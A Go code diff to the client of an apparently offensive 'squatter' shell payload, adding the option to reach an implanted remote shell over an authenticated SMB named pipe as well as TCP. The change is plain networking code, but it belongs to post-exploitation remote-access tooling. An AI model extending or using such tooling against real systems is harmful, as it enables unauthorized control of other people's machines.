@@ -11,16 +11,19 @@
 package main
 
 import (
+	"context"
 	"fmt"
+	"io"
 	"net"
 	"os"
 
 	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/shell"
+	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/smbpipe"
 )
 
 func main() {
 	opts := shell.ParseCLI(os.Args[1:])
-	conn, err := net.Dial("tcp", net.JoinHostPort(opts.Host, opts.Port))
+	conn, err := dial(opts)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, "connect:", err)
 		os.Exit(1)
@@ -36,4 +39,22 @@ func main() {
 	default:
 		client.RunPrompt(net.JoinHostPort(opts.Host, opts.Port))
 	}
+}
+
+func dial(opts shell.CLIOptions) (io.ReadWriteCloser, error) {
+	if opts.SMB {
+		password := opts.Password
+		if password == "" {
+			password = os.Getenv("SQUATTER_SMB_PASSWORD")
+		}
+		return smbpipe.Dialer{}.Dial(context.Background(), smbpipe.Options{
+			Host:     opts.Host,
+			Port:     opts.SMBPort,
+			Domain:   opts.Domain,
+			Username: opts.Username,
+			Password: password,
+			Pipe:     opts.Pipe,
+		})
+	}
+	return net.Dial("tcp", net.JoinHostPort(opts.Host, opts.Port))
 }
